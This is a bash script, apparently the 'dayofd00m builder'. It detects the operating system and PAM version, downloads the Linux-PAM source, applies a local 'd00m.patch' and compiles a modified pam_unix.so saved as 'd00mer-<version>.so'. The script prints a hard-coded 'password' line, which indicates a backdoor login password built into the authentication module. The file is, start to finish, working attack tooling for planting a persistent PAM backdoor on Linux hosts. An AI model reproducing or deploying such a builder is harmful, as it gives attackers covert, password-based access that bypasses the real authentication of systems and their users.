#!/bin/bash

set -e

trap "exit" INT

RED='\033[0;91m'
GREEN='\033[0;92m'
BLUE='\033[0;94m'
MAGENT='\033[0;95m'
NC='\033[0m'

OPTIND=1
DETERMINEFLAG=1
function determine_os {
	if [ -f "/etc/debian_version" ] ; then
		echo -e "${GREEN}[+]${NC} Debian-based distribution detected."
		PAM_VERSION=$(dpkg -l | grep libpam-modules-bin | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	## rest is just an OS detection algorithm. actual detection TBD.
	elif lsb_release -d | grep -q "Fedora"; then
		echo -e "${GREEN}[+]${NC} Fedora distribution detected."
		## todo
	elif lsb_release -d | grep -q "Arch"; then
		echo -e "${GREEN}[+]${NC} Arch distribution detected."
		PAM_VERSION=$(pacman -Ss | grep -w "core/pam" | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	elif lsb_release -d | grep -q "CentOS"; then
		echo -e "${GREEN}[+]${NC} CentOS distribution detected."		
		## todo
	elif lsb_release -d | grep -q "Manjaro"; then
		echo -e "${GREEN}[+]${NC} Manjaro distribution detected."		
		PAM_VERSION=$(pacman -Ss | grep -w "core/pam" | sed -nre 's/^[^1]*(([0-9]+\.)*[0-9]+).*/\1/p')
	elif uname | grep -q "Darwin"; then
		echo -e "${RED}[-]${NC} Mac OS X detected."
		## todo
	else		
		echo -e "${RED}[-]${NC} unknown distribution, work in progress."
	fi;
	## would be cool to add %name%-based distribution gradation like Debian-based.
}
PAM_FILE=
echo ""
echo -e "
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%    .@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@         %@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@%            &@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@.           .@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%            %@@@@@*,@@@@@@@@@@@@@@@@@
@@@@@@@@@.           .@@@@@@     &@@@@@@@@@@@@@@@
@@@@@@%            %@@@@@*         @@@@@@@@@@@@@@
@@@@#             @@@@&            (@@@@@@@@@@@@@
@@@@@@             /,            @@@@@@(@@@@@@@@@
@@@@@@@&                      (@@@@@@    &@@@@@@@
@@@@@@@@@,                  @@@@@@*        @@@@@@
@@@@@@@@@@@              (@@@@@@            &@@@@
@@@@@@@@@@@@#             @@@,            @@@@@@@
@@@@@@@@@@@@@@             *           (@@@@@@@@@
@@@@@@@@@@@@@@@@                     @@@@@@@@@@@@
@@@@@@@@@@@@@@@@@*                #@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@             @@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%        %@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@.   .@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@
@@@dayofd00m@builder@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"

function show_help {
	echo ""
	echo -e "${BLUE}[?]${NC} just run it as-is."
	echo -e "${BLUE}[?]${NC} optional: -n to disable OS and PAM detection"
	echo ""
}

while getopts ":h?:n?" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    n)	DETERMINEFLAG=0
		;;
    esac
done

shift $((OPTIND-1))

[ "$1" = "--" ] && shift

echo ""
if [ $DETERMINEFLAG != 0 ]; then
determine_os
else
echo -e "${BLUE}[*]${NC} determine OS and PAM version disabled."
echo ""
fi;
if [ -z $PAM_VERSION ]; then 
	echo ""
	printf "${RED}[-]${NC} automatic PAM version detection failed. please specify it manually: " && read -r PAM_VERSION
fi;
echo ""
echo -e "${GREEN}[+]${NC} PAM version: $PAM_VERSION"
echo -e "${GREEN}[+]${NC} password: %a %b %d "
echo ""
if [ ! -f "./d00m.patch" ] && [ ! -f "./d00m_legacy.patch" ]; then
echo -e "${RED}[-]${NC} no .patch file present, how i am supposed to patch without them?"
echo ""
exit 1
else
echo -e "${GREEN}[+]${NC} fetching and extracting PAM..."
echo ""
if [ $PAM_VERSION == '1.3.1' ]; then
PAM_BASE_URL="https://github.com/linux-pam/linux-pam/releases/download/v1.3.1"
PAM_DIR="Linux-PAM-${PAM_VERSION}"
PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.xz"
PATCH_DIR=`which patch`
wget -c "${PAM_BASE_URL}/${PAM_FILE}"
tar xf $PAM_FILE
echo -e "${GREEN}[+]${NC} patching PAM..."
cat d00m.patch | patch -p1 -d $PAM_DIR
cd $PAM_DIR
echo -e "${GREEN}[+]${NC} building..."
./configure &> /dev/null 
make &> /dev/null
cp modules/pam_unix/.libs/pam_unix.so ../d00mer-${PAM_VERSION}.so
cd ..
elif [ $PAM_VERSION == '1.3.0' ]; then
PAM_BASE_URL="http://www.linux-pam.org/library"
PAM_DIR="Linux-PAM-${PAM_VERSION}"
PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.bz2"
PATCH_DIR=`which patch`
wget -c "${PAM_BASE_URL}/${PAM_FILE}"
tar xjf $PAM_FILE
echo -e "${GREEN}[+]${NC} patching PAM..."
cat d00m.patch | patch -p1 -d $PAM_DIR
cd $PAM_DIR
echo -e "${GREEN}[+]${NC} building..."
./configure &> /dev/null
make &> /dev/null
cp modules/pam_unix/.libs/pam_unix.so ../d00mer-${PAM_VERSION}.so
cd ..
else
PAM_BASE_URL="http://www.linux-pam.org/library"
PAM_DIR="Linux-PAM-${PAM_VERSION}"
PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.bz2"
PATCH_DIR=`which patch`
wget -c "${PAM_BASE_URL}/${PAM_FILE}"
tar xjf $PAM_FILE
echo -e "${GREEN}[+]${NC} patching PAM..."
cat d00m_legacy.patch | patch -p1 -d $PAM_DIR
cd $PAM_DIR
echo -e "${GREEN}[+]${NC} building..."
./configure &> /dev/null
make &> /dev/null
cp modules/pam_unix/.libs/pam_unix.so ../d00mer-${PAM_VERSION}.so
cd ..
fi;
if [ $? -ne 0 ]; then
	echo -e "${RED}[-]${NC} error: patch command not found. exiting..."
	exit 1
fi
echo -e "${GREEN}[+]${NC} done."
if [ -f "./d00mer-${PAM_VERSION}.so" ] ; then
	if [ -f "/etc/debian_version" ] ; then
		echo -e "${GREEN}[+]${NC} chmodding for Debian-based..."
		chmod 644 ./d00mer-${PAM_VERSION}.so
	else
		echo -e "${GREEN}[+]${NC} chmodding for Arch-based..."
		chmod 755 ./d00mer-${PAM_VERSION}.so
		## rest TBD
	fi;
else
echo -e "${RED}[-]${NC} something gone wrong during build, pam_unix.so not present."
exit 1
fi;
echo -e "${GREEN}[+]${NC} built to ./d00mer-${PAM_VERSION}.so"
echo -e "${GREEN}[+]${NC} cleaning up mess..."
rm -rf Linux-PAM-${PAM_VERSION}*
echo ""
fi;
